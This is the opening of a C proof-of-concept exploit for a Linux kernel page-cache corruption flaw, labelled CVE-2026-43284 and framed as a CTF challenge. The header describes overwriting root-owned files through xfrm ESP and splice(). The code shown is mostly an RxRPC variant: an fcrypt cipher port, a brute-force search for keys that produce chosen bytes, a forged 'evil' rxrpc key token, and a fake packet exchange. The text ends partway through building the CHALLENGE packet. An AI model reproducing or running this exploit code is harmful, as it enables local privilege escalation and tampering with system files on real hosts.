/**
 * CVE-2026-43284 PoC - CTF Challenge Mode
 *
 * xfrm-ESP page cache pollution via splice() shared pages.
 *
 * ESP-only exploit (single variant):
 *   Uses unshare(CLONE_NEWUSER|CLONE_NEWNET) + xfrm SA with ESN.
 *   Each SA's seq_hi field carries 4 bytes of desired payload.
 *   splice() -> UDP ESP-in-UDP -> kernel xfrm_input writes seq_hi
 *   to page cache, modifying the target file content.
 *
 * This CVE is specifically an xfrm-ESP vulnerability and only uses
 * the ESP exploit path. RxRPC code is retained but unused.
 *
 * CTF Modes:
 *   write_root_file - Overwrite target file via page cache corruption
 *   read_root_file  - Read target file content (direct read on 0644 files)
 *
 * Build:
 *   gcc -static -O2 -o poc poc.c
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <poll.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <endian.h>

/* ESP variant requires these additional headers */
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

/* ========================================================================
 * Constants
 * ======================================================================== */
#define MAX_FILE_SIZE       4096

/* Override default timeout - RxRPC triggers need more time */
#undef POC_MAX_RUNTIME_SEC
#define POC_MAX_RUNTIME_SEC 60

/* AF_RXRPC constants */
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef KEY_SPEC_PROCESS_KEYRING
#define KEY_SPEC_PROCESS_KEYRING -2
#endif

/* ESP variant constants */
#define ESP_ENC_PORT       4500
#define ESP_SEQ_VAL        200
#define ESP_REPLAY_SEQ     100

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

/* rxrpc socket options */
#define RXRPC_SECURITY_KEY        1
#define RXRPC_MIN_SECURITY_LEVEL  4
#define RXRPC_SECURITY_AUTH       1
#define RXRPC_USER_CALL_ID        1

/* rxrpc wire protocol constants */
#define RXRPC_PACKET_TYPE_DATA      1
#define RXRPC_PACKET_TYPE_CHALLENGE 6
#define RXRPC_LAST_PACKET           0x04
#define RXRPC_CHANNELMASK           3
#define RXRPC_CIDSHIFT              2

/* Fixed session key shared between Prepare handler and PoC */
static uint8_t SESSION_KEY[8] = {
    0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE
};

/* ========================================================================
 * Wire protocol structures
 * ======================================================================== */
struct rxrpc_wire_header {
    uint32_t epoch;
    uint32_t cid;
    uint32_t callNumber;
    uint32_t seq;
    uint32_t serial;
    uint8_t  type;
    uint8_t  flags;
    uint8_t  userStatus;
    uint8_t  securityIndex;
    uint16_t cksum;
    uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
    uint32_t version;
    uint32_t nonce;
    uint32_t min_level;
    uint32_t __padding;
} __attribute__((packed));

struct sockaddr_rxrpc {
    uint16_t srx_family;
    uint16_t srx_service;
    uint16_t transport_type;
    uint16_t transport_len;
    union {
        struct sockaddr_in sin;
        struct sockaddr_in6 sin6;
    } transport;
};

/* ========================================================================
 * fcrypt implementation (port of kernel crypto/fcrypt.c)
 *
 * fcrypt is a 16-round Feistel cipher used by rxkad for packet checksums
 * and payload encrypt/decrypt. We implement it in userspace to avoid
 * AF_ALG dependency.
 * ======================================================================== */

static const uint8_t fc_sbox0_raw[256] = {
    0xea,0x7f,0xb2,0x64,0x9d,0xb0,0xd9,0x11,0xcd,0x86,0x86,0x91,0x0a,0xb2,0x93,0x06,
    0x0e,0x06,0xd2,0x65,0x73,0xc5,0x28,0x60,0xf2,0x20,0xb5,0x38,0x7e,0xda,0x9f,0xe3,
    0xd2,0xcf,0xc4,0x3c,0x61,0xff,0x4a,0x4a,0x35,0xac,0xaa,0x5f,0x2b,0xbb,0xbc,0x53,
    0x4e,0x9d,0x78,0xa3,0xdc,0x09,0x32,0x10,0xc6,0x6f,0x66,0xd6,0xab,0xa9,0xaf,0xfd,
    0x3b,0x95,0xe8,0x34,0x9a,0x81,0x72,0x80,0x9c,0xf3,0xec,0xda,0x9f,0x26,0x76,0x15,
    0x3e,0x55,0x4d,0xde,0x84,0xee,0xad,0xc7,0xf1,0x6b,0x3d,0xd3,0x04,0x49,0xaa,0x24,
    0x0b,0x8a,0x83,0xba,0xfa,0x85,0xa0,0xa8,0xb1,0xd4,0x01,0xd8,0x70,0x64,0xf0,0x51,
    0xd2,0xc3,0xa7,0x75,0x8c,0xa5,0x64,0xef,0x10,0x4e,0xb7,0xc6,0x61,0x03,0xeb,0x44,
    0x3d,0xe5,0xb3,0x5b,0xae,0xd5,0xad,0x1d,0xfa,0x5a,0x1e,0x33,0xab,0x93,0xa2,0xb7,
    0xe7,0xa8,0x45,0xa4,0xcd,0x29,0x63,0x44,0xb6,0x69,0x7e,0x2e,0x62,0x03,0xc8,0xe0,
    0x17,0xbb,0xc7,0xf3,0x3f,0x36,0xba,0x71,0x8e,0x97,0x65,0x60,0x69,0xb6,0xf6,0xe6,
    0x6e,0xe0,0x81,0x59,0xe8,0xaf,0xdd,0x95,0x22,0x99,0xfd,0x63,0x19,0x74,0x61,0xb1,
    0xb6,0x5b,0xae,0x54,0xb3,0x70,0xff,0xc6,0x3b,0x3e,0xc1,0xd7,0xe1,0x0e,0x76,0xe5,
    0x36,0x4f,0x59,0xc7,0x08,0x6e,0x82,0xa6,0x93,0xc4,0xaa,0x26,0x49,0xe0,0x21,0x64,
    0x07,0x9f,0x64,0x81,0x9c,0xbf,0xf9,0xd1,0x43,0xf8,0xb6,0xb9,0xf1,0x24,0x75,0x03,
    0xe4,0xb0,0x99,0x46,0x3d,0xf5,0xd1,0x39,0x72,0x12,0xf6,0xba,0x0c,0x0d,0x42,0x2e,
};
static const uint8_t fc_sbox1_raw[256] = {
    0x77,0x14,0xa6,0xfe,0xb2,0x5e,0x8c,0x3e,0x67,0x6c,0xa1,0x0d,0xc2,0xa2,0xc1,0x85,
    0x6c,0x7b,0x67,0xc6,0x23,0xe3,0xf2,0x89,0x50,0x9c,0x03,0xb7,0x73,0xe6,0xe1,0x39,
    0x31,0x2c,0x27,0x9f,0xa5,0x69,0x44,0xd6,0x23,0x83,0x98,0x7d,0x3c,0xb4,0x2d,0x99,
    0x1c,0x1f,0x8c,0x20,0x03,0x7c,0x5f,0xad,0xf4,0xfa,0x95,0xca,0x76,0x44,0xcd,0xb6,
    0xb8,0xa1,0xa1,0xbe,0x9e,0x54,0x8f,0x0b,0x16,0x74,0x31,0x8a,0x23,0x17,0x04,0xfa,
    0x79,0x84,0xb1,0xf5,0x13,0xab,0xb5,0x2e,0xaa,0x0c,0x60,0x6b,0x5b,0xc4,0x4b,0xbc,
    0xe2,0xaf,0x45,0x73,0xfa,0xc9,0x49,0xcd,0x00,0x92,0x7d,0x97,0x7a,0x18,0x60,0x3d,
    0xcf,0x5b,0xde,0xc6,0xe2,0xe6,0xbb,0x8b,0x06,0xda,0x08,0x15,0x1b,0x88,0x6a,0x17,
    0x89,0xd0,0xa9,0xc1,0xc9,0x70,0x6b,0xe5,0x43,0xf4,0x68,0xc8,0xd3,0x84,0x28,0x0a,
    0x52,0x66,0xa3,0xca,0xf2,0xe3,0x7f,0x7a,0x31,0xf7,0x88,0x94,0x5e,0x9c,0x63,0xd5,
    0x24,0x66,0xfc,0xb3,0x57,0x25,0xbe,0x89,0x44,0xc4,0xe0,0x8f,0x23,0x3c,0x12,0x52,
    0xf5,0x1e,0xf4,0xcb,0x18,0x33,0x1f,0xf8,0x69,0x10,0x9d,0xd3,0xf7,0x28,0xf8,0x30,
    0x05,0x5e,0x32,0xc0,0xd5,0x19,0xbd,0x45,0x8b,0x5b,0xfd,0xbc,0xe2,0x5c,0xa9,0x96,
    0xef,0x70,0xcf,0xc2,0x2a,0xb3,0x61,0xad,0x80,0x48,0x81,0xb7,0x1d,0x43,0xd9,0xd7,
    0x45,0xf0,0xd8,0x8a,0x59,0x7c,0x57,0xc1,0x79,0xc7,0x34,0xd6,0x43,0xdf,0xe4,0x78,
    0x16,0x06,0xda,0x92,0x76,0x51,0xe1,0xd4,0x70,0x03,0xe0,0x2f,0x96,0x91,0x82,0x80,
};
static const uint8_t fc_sbox2_raw[256] = {
    0xf0,0x37,0x24,0x53,0x2a,0x03,0x83,0x86,0xd1,0xec,0x50,0xf0,0x42,0x78,0x2f,0x6d,
    0xbf,0x80,0x87,0x27,0x95,0xe2,0xc5,0x5d,0xf9,0x6f,0xdb,0xb4,0x65,0x6e,0xe7,0x24,
    0xc8,0x1a,0xbb,0x49,0xb5,0x0a,0x7d,0xb9,0xe8,0xdc,0xb7,0xd9,0x45,0x20,0x1b,0xce,
    0x59,0x9d,0x6b,0xbd,0x0e,0x8f,0xa3,0xa9,0xbc,0x74,0xa6,0xf6,0x7f,0x5f,0xb1,0x68,
    0x84,0xbc,0xa9,0xfd,0x55,0x50,0xe9,0xb6,0x13,0x5e,0x07,0xb8,0x95,0x02,0xc0,0xd0,
    0x6a,0x1a,0x85,0xbd,0xb6,0xfd,0xfe,0x17,0x3f,0x09,0xa3,0x8d,0xfb,0xed,0xda,0x1d,
    0x6d,0x1c,0x6c,0x01,0x5a,0xe5,0x71,0x3e,0x8b,0x6b,0xbe,0x29,0xeb,0x12,0x19,0x34,
    0xcd,0xb3,0xbd,0x35,0xea,0x4b,0xd5,0xae,0x2a,0x79,0x5a,0xa5,0x32,0x12,0x7b,0xdc,
    0x2c,0xd0,0x22,0x4b,0xb1,0x85,0x59,0x80,0xc0,0x30,0x9f,0x73,0xd3,0x14,0x48,0x40,
    0x07,0x2d,0x8f,0x80,0x0f,0xce,0x0b,0x5e,0xb7,0x5e,0xac,0x24,0x94,0x4a,0x18,0x15,
    0x05,0xe8,0x02,0x77,0xa9,0xc7,0x40,0x45,0x89,0xd1,0xea,0xde,0x0c,0x79,0x2a,0x99,
    0x6c,0x3e,0x95,0xdd,0x8c,0x7d,0xad,0x6f,0xdc,0xff,0xfd,0x62,0x47,0xb3,0x21,0x8a,
    0xec,0x8e,0x19,0x18,0xb4,0x6e,0x3d,0xfd,0x74,0x54,0x1e,0x04,0x85,0xd8,0xbc,0x1f,
    0x56,0xe7,0x3a,0x56,0x67,0xd6,0xc8,0xa5,0xf3,0x8e,0xde,0xae,0x37,0x49,0xb7,0xfa,
    0xc8,0xf4,0x1f,0xe0,0x2a,0x9b,0x15,0xd1,0x34,0x0e,0xb5,0xe0,0x44,0x78,0x84,0x59,
    0x56,0x68,0x77,0xa5,0x14,0x06,0xf5,0x2f,0x8c,0x8a,0x73,0x80,0x76,0xb4,0x10,0x86,
};
static const uint8_t fc_sbox3_raw[256] = {
    0xa9,0x2a,0x48,0x51,0x84,0x7e,0x49,0xe2,0xb5,0xb7,0x42,0x33,0x7d,0x5d,0xa6,0x12,
    0x44,0x48,0x6d,0x28,0xaa,0x20,0x6d,0x57,0xd6,0x6b,0x5d,0x72,0xf0,0x92,0x5a,0x1b,
    0x53,0x80,0x24,0x70,0x9a,0xcc,0xa7,0x66,0xa1,0x01,0xa5,0x41,0x97,0x41,0x31,0x82,
    0xf1,0x14,0xcf,0x53,0x0d,0xa0,0x10,0xcc,0x2a,0x7d,0xd2,0xbf,0x4b,0x1a,0xdb,0x16,
    0x47,0xf6,0x51,0x36,0xed,0xf3,0xb9,0x1a,0xa7,0xdf,0x29,0x43,0x01,0x54,0x70,0xa4,
    0xbf,0xd4,0x0b,0x53,0x44,0x60,0x9e,0x23,0xa1,0x18,0x68,0x4f,0xf0,0x2f,0x82,0xc2,
    0x2a,0x41,0xb2,0x42,0x0c,0xed,0x0c,0x1d,0x13,0x3a,0x3c,0x6e,0x35,0xdc,0x60,0x65,
    0x85,0xe9,0x64,0x02,0x9a,0x3f,0x9f,0x87,0x96,0xdf,0xbe,0xf2,0xcb,0xe5,0x6c,0xd4,
    0x5a,0x83,0xbf,0x92,0x1b,0x94,0x00,0x42,0xcf,0x4b,0x00,0x75,0xba,0x8f,0x76,0x5f,
    0x5d,0x3a,0x4d,0x09,0x12,0x08,0x38,0x95,0x17,0xe4,0x01,0x1d,0x4c,0xa9,0xcc,0x85,
    0x82,0x4c,0x9d,0x2f,0x3b,0x66,0xa1,0x34,0x10,0xcd,0x59,0x89,0xa5,0x31,0xcf,0x05,
    0xc8,0x84,0xfa,0xc7,0xba,0x4e,0x8b,0x1a,0x19,0xf1,0xa1,0x3b,0x18,0x12,0x17,0xb0,
    0x98,0x8d,0x0b,0x23,0xc3,0x3a,0x2d,0x20,0xdf,0x13,0xa0,0xa8,0x4c,0x0d,0x6c,0x2f,
    0x47,0x13,0x13,0x52,0x1f,0x2d,0xf5,0x79,0x3d,0xa2,0x54,0xbd,0x69,0xc8,0x6b,0xf3,
    0x05,0x28,0xf1,0x16,0x46,0x40,0xb0,0x11,0xd3,0xb7,0x95,0x49,0xcf,0xc3,0x1d,0x8f,
    0xd8,0xe1,0x73,0xdb,0xad,0xc8,0xc9,0xa9,0xa1,0xc2,0xc5,0xe3,0xba,0xfc,0x0e,0x25,
};

static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];
static int fc_sboxes_inited = 0;

static void fcrypt_init_sboxes(void)
{
    if (fc_sboxes_inited) return;
    for (int i = 0; i < 256; i++) {
        fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
        fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
                               ((uint32_t)fc_sbox1_raw[i] >> 5));
        fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
        fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
    }
    fc_sboxes_inited = 1;
}

#define fc_ror56_64(k, n) \
    (k = (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))

typedef struct { uint32_t sched[16]; } fcrypt_ctx;

static void fcrypt_setkey(fcrypt_ctx *ctx, const uint8_t key[8])
{
    uint64_t k = 0;
    k  = (uint64_t)(key[0] >> 1);
    k <<= 7; k |= (uint64_t)(key[1] >> 1);
    k <<= 7; k |= (uint64_t)(key[2] >> 1);
    k <<= 7; k |= (uint64_t)(key[3] >> 1);
    k <<= 7; k |= (uint64_t)(key[4] >> 1);
    k <<= 7; k |= (uint64_t)(key[5] >> 1);
    k <<= 7; k |= (uint64_t)(key[6] >> 1);
    k <<= 7; k |= (uint64_t)(key[7] >> 1);

    for (int i = 0; i < 16; i++) {
        ctx->sched[i] = htobe32((uint32_t)k);
        fc_ror56_64(k, 11);
    }
}

#define FC_F(R_, L_, sched_) do {                              \
    union { uint32_t l; uint8_t c[4]; } u;                     \
    u.l = (sched_) ^ (R_);                                     \
    L_ ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^              \
           fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];               \
} while (0)

static void __attribute__((unused)) fcrypt_decrypt(const fcrypt_ctx *ctx, uint8_t out[8], const uint8_t in[8])
{
    uint32_t L, R;
    memcpy(&L, in, 4);
    memcpy(&R, in + 4, 4);
    FC_F(L, R, ctx->sched[0xf]);
    FC_F(R, L, ctx->sched[0xe]);
    FC_F(L, R, ctx->sched[0xd]);
    FC_F(R, L, ctx->sched[0xc]);
    FC_F(L, R, ctx->sched[0xb]);
    FC_F(R, L, ctx->sched[0xa]);
    FC_F(L, R, ctx->sched[0x9]);
    FC_F(R, L, ctx->sched[0x8]);
    FC_F(L, R, ctx->sched[0x7]);
    FC_F(R, L, ctx->sched[0x6]);
    FC_F(L, R, ctx->sched[0x5]);
    FC_F(R, L, ctx->sched[0x4]);
    FC_F(L, R, ctx->sched[0x3]);
    FC_F(R, L, ctx->sched[0x2]);
    FC_F(L, R, ctx->sched[0x1]);
    FC_F(R, L, ctx->sched[0x0]);
    memcpy(out, &L, 4);
    memcpy(out + 4, &R, 4);
}

static void fcrypt_encrypt(const fcrypt_ctx *ctx, uint8_t out[8], const uint8_t in[8])
{
    uint32_t L, R;
    memcpy(&L, in, 4);
    memcpy(&R, in + 4, 4);
    FC_F(R, L, ctx->sched[0x0]);
    FC_F(L, R, ctx->sched[0x1]);
    FC_F(R, L, ctx->sched[0x2]);
    FC_F(L, R, ctx->sched[0x3]);
    FC_F(R, L, ctx->sched[0x4]);
    FC_F(L, R, ctx->sched[0x5]);
    FC_F(R, L, ctx->sched[0x6]);
    FC_F(L, R, ctx->sched[0x7]);
    FC_F(R, L, ctx->sched[0x8]);
    FC_F(L, R, ctx->sched[0x9]);
    FC_F(R, L, ctx->sched[0xa]);
    FC_F(L, R, ctx->sched[0xb]);
    FC_F(R, L, ctx->sched[0xc]);
    FC_F(L, R, ctx->sched[0xd]);
    FC_F(R, L, ctx->sched[0xe]);
    FC_F(L, R, ctx->sched[0xf]);
    memcpy(out, &L, 4);
    memcpy(out + 4, &R, 4);
}

/* PCBC encrypt: used for computing csum_iv and cksum */
static void pcbc_fcrypt_encrypt(const uint8_t key[8], const uint8_t iv[8],
                                const uint8_t *in, uint8_t *out, size_t len)
{
    fcrypt_ctx ctx;
    fcrypt_setkey(&ctx, key);
    uint8_t prev_p[8], prev_c[8];
    memcpy(prev_c, iv, 8);
    memset(prev_p, 0, 8);
    /* For first block, PCBC: C0 = E(P0 XOR IV) and feedback = P0 XOR C0 */
    for (size_t off = 0; off < len; off += 8) {
        uint8_t tmp[8];
        for (int i = 0; i < 8; i++)
            tmp[i] = in[off + i] ^ prev_p[i] ^ prev_c[i];
        fcrypt_encrypt(&ctx, out + off, tmp);
        memcpy(prev_p, in + off, 8);
        memcpy(prev_c, out + off, 8);
    }
}

/* Compute csum_iv (ref: rxkad_prime_packet_security) */
static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
                           const uint8_t key[8], uint8_t csum_iv[8])
{
    uint32_t in[4] = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
    uint8_t out[16];
    pcbc_fcrypt_encrypt(key, key, (uint8_t *)in, out, 16);
    memcpy(csum_iv, out + 8, 8);
    return 0;
}

/* Compute wire cksum (ref: rxkad_secure_packet) */
static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
                         const uint8_t key[8], const uint8_t csum_iv[8],
                         uint16_t *cksum_out)
{
    uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
    x |= seq & 0x3fffffff;
    uint32_t in[2] = { htonl(call_id), htonl(x) };
    uint32_t out[2];
    pcbc_fcrypt_encrypt(key, csum_iv, (uint8_t *)in, (uint8_t *)out, 8);
    uint32_t y = ntohl(out[1]);
    uint16_t v = (y >> 16) & 0xffff;
    if (v == 0) v = 1;
    *cksum_out = v;
    return 0;
}

/* ========================================================================
 * Brute-force key search for overlapping 2-byte RxRPC triggers
 *
 * The kernel's rxkad_verify_packet_1() does an in-place 8-byte
 * fcrypt_decrypt with the session key on the page-cache page at the
 * splice offset.  By searching for a session key K such that
 * decrypt(C, K)[0..1] equals our desired 2 bytes, we can control
 * which bytes get written.  With overlapping 2-byte steps, each
 * trigger controls exactly 2 bytes of the final file content.
 * ======================================================================== */

static uint64_t fc_splitmix64(uint64_t *s)
{
    uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

/* Find key K such that fcrypt_decrypt(C, K)[0]==want0 && [1]==want1.
 * Returns 0 on success, -1 if max_iters exhausted. */
static int find_key_for_2bytes(const uint8_t C[8], uint8_t want0, uint8_t want1,
                               uint8_t K_out[8], uint8_t P_out[8],
                               uint64_t max_iters, uint64_t seed)
{
    fcrypt_ctx ctx;
    uint8_t K[8], P[8];

    for (uint64_t iter = 0; iter < max_iters; iter++) {
        uint64_t r = fc_splitmix64(&seed);
        memcpy(K, &r, 8);
        fcrypt_setkey(&ctx, K);
        fcrypt_decrypt(&ctx, P, C);

        if (P[0] == want0 && P[1] == want1) {
            memcpy(K_out, K, 8);
            memcpy(P_out, P, 8);
            return 0;
        }
    }
    return -1;
}

/* ========================================================================
 * RxRPC key management
 * ======================================================================== */

static long sys_add_key(const char *type, const char *desc,
                        const void *payload, size_t plen, int ringid)
{
    return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen, const uint8_t key[8])
{
    uint8_t *p = out;
    uint32_t now = (uint32_t)time(NULL);
    uint32_t expires = now + 86400;
    *(uint32_t *)p = htonl(0); p += 4;           /* flags */
    const char *cell = "evil";
    uint32_t clen = strlen(cell);
    *(uint32_t *)p = htonl(clen); p += 4;
    memcpy(p, cell, clen);
    uint32_t pad = (4 - (clen & 3)) & 3;
    memset(p + clen, 0, pad);
    p += clen + pad;
    *(uint32_t *)p = htonl(1); p += 4;           /* ntoken */
    uint8_t *toklen_p = p; p += 4;
    uint8_t *tokstart = p;
    *(uint32_t *)p = htonl(2); p += 4;           /* sec_ix = RXKAD */
    *(uint32_t *)p = htonl(0); p += 4;           /* vice_id */
    *(uint32_t *)p = htonl(1); p += 4;           /* kvno */
    memcpy(p, key, 8); p += 8;                   /* session_key */
    *(uint32_t *)p = htonl(now); p += 4;
    *(uint32_t *)p = htonl(expires); p += 4;
    *(uint32_t *)p = htonl(1); p += 4;           /* primary_flag */
    *(uint32_t *)p = htonl(8); p += 4;           /* ticket_len */
    memset(p, 0xCC, 8); p += 8;                  /* ticket */
    uint32_t toklen = (uint32_t)(p - tokstart);
    *(uint32_t *)toklen_p = htonl(toklen);
    if ((size_t)(p - out) > maxlen) return -1;
    return (int)(p - out);
}

static long add_rxrpc_key(const char *desc, const uint8_t key[8])
{
    uint8_t buf[512];
    int n = build_rxrpc_v1_token(buf, sizeof(buf), key);
    if (n < 0) return -1;
    return sys_add_key("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

/* ========================================================================
 * RxRPC client/server setup
 * ======================================================================== */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
    int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (fd < 0) return -1;
    if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
                   keyname, strlen(keyname)) < 0) {
        close(fd); return -1;
    }
    int min_level = RXRPC_SECURITY_AUTH;
    if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
                   &min_level, sizeof(min_level)) < 0) {
        close(fd); return -1;
    }
    struct sockaddr_rxrpc srx = {0};
    srx.srx_family = AF_RXRPC;
    srx.srx_service = 0;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(local_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
        close(fd); return -1;
    }
    return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
                                      uint16_t service_id,
                                      unsigned long user_call_id)
{
    char data[8] = "PINGPING";
    struct sockaddr_rxrpc srx = {0};
    srx.srx_family = AF_RXRPC;
    srx.srx_service = service_id;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port = htons(srv_port);
    srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

    char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
    struct msghdr msg = {0};
    msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
    struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
    msg.msg_iov = &iov; msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_RXRPC;
    cmsg->cmsg_type = RXRPC_USER_CALL_ID;
    cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

    int fl = fcntl(cli_fd, F_GETFL);
    fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
    ssize_t n = sendmsg(cli_fd, &msg, 0);
    fcntl(cli_fd, F_SETFL, fl);
    if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) return -1;
    return 0;
}

static int setup_udp_server(uint16_t port)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return -1;
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = htonl(0x7F000001);
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(s); return -1;
    }
    return s;
}

static ssize_t udp_recv_to(int s, void *buf, size_t cap,
                           struct sockaddr_in *from, int timeout_ms)
{
    struct pollfd pfd = { .fd = s, .events = POLLIN };
    int rc = poll(&pfd, 1, timeout_ms);
    if (rc <= 0) return -1;
    socklen_t fl = from ? sizeof(*from) : 0;
    return recvfrom(s, buf, cap, 0, (struct sockaddr *)from, from ? &fl : NULL);
}

/* ========================================================================
 * do_one_rxrpc_trigger - Trigger one 8-byte page cache decrypt at offset
 *
 * Flow:
 *   1. add_key("rxrpc", ...) with SESSION_KEY
 *   2. Setup fake UDP server + AF_RXRPC client
 *   3. Client initiates call → server receives DATA
 *   4. Server sends CHALLENGE → client responds
 *   5. Build malicious DATA with correct cksum
 *   6. vmsplice header + splice file data → pipe → UDP → client
 *   7. Kernel's rxkad_verify_packet_1() decrypts in-place on page cache
 * ======================================================================== */
static int g_trigger_seq = 0;

/* Pick a random port pair in [10000, 60000) range, seeded by PID */
static void pick_port_pair(uint16_t *srv_port, uint16_t *cli_port)
{
    static int seeded = 0;
    if (!seeded) { srand((unsigned)(getpid() ^ time(NULL))); seeded = 1; }
    uint16_t base = 10000 + (rand() % 50000);
    base &= ~1; /* even */
    *srv_port = base;
    *cli_port = base + 1;
}

static int do_one_rxrpc_trigger(int target_fd, off_t splice_off)
{
    char keyname[64];
    snprintf(keyname, sizeof(keyname), "evil_%d_%d", (int)getpid(), g_trigger_seq++);

    long key_id = add_rxrpc_key(keyname, SESSION_KEY);
    if (key_id < 0) {
        poc_log("add_rxrpc_key(%s) failed: %s", keyname, strerror(errno));
        return -1;
    }
    poc_log("add_rxrpc_key(%s) = %ld", keyname, key_id);

    /* Use random ports to avoid TIME_WAIT conflicts */
    uint16_t port_S, port_C;
    pick_port_pair(&port_S, &port_C);
    uint16_t svc_id = 1234;
    int ret = -1;

    /* Retry with different ports on EADDRINUSE */
    int udp_srv = -1, rxsk_cli = -1;
    for (int port_try = 0; port_try < 5; port_try++) {
        if (port_try > 0) pick_port_pair(&port_S, &port_C);
        udp_srv = setup_udp_server(port_S);
        if (udp_srv < 0) {
            if (errno == EADDRINUSE) {
                poc_log("port %u in use, retrying (%d/5)...", port_S, port_try + 1);
                continue;
            }
            poc_log("setup_udp_server(%u) failed: %s", port_S, strerror(errno));
            goto cleanup_key;
        }
        rxsk_cli = setup_rxrpc_client(port_C, keyname);
        if (rxsk_cli < 0) {
            if (errno == EADDRINUSE) {
                poc_log("port %u in use, retrying (%d/5)...", port_C, port_try + 1);
                close(udp_srv); udp_srv = -1;
                continue;
            }
            poc_log("setup_rxrpc_client(%u, %s) failed: %s", port_C, keyname, strerror(errno));
            close(udp_srv);
            goto cleanup_key;
        }
        break;
    }
    if (udp_srv < 0 || rxsk_cli < 0) {
        poc_log("Failed to find available port pair after 5 attempts");
        if (udp_srv >= 0) close(udp_srv);
        goto cleanup_key;
    }

    if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
        poc_log("rxrpc_client_initiate_call failed: %s", strerror(errno));
        goto cleanup_both;
    }

    /* Receive client's initial DATA packet on our fake server */
    uint8_t pkt[2048];
    struct sockaddr_in cli_addr;
    ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 2000);
    if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
        poc_log("udp_recv_to: n=%zd (need >= %zu)", n, sizeof(struct rxrpc_wire_header));
        goto cleanup_both;
    }

    struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
    uint32_t epoch  = ntohl(whdr_in->epoch);
    uint32_t cid    = ntohl(whdr_in->cid);
    uint32_t callN  = ntohl(whdr_in->callNumber);
    uint16_t svc_in = ntohs(whdr_in->serviceId);
    uint16_t cli_port = ntohs(cli_addr.sin_port);
    poc_log("Received DATA: epoch=0x%x cid=0x%x call=%u svc=%u cli_port=%u",
            epoch, cid, callN, svc_in, cli_port);

    /* Send CHALLENGE to the client */
    {
        struct {
            struct rxrpc_wire_header hdr;
            struct rxkad_challenge   ch;
        } __attribute__((packed)) c = {0};
        c.hdr.epoch = htonl(epoch);
        c.hdr.cid = htonl(cid);
        c.hdr.callNumber = 0; c.hdr.seq = 0;
        c.hdr.serial = htonl(0x10000);
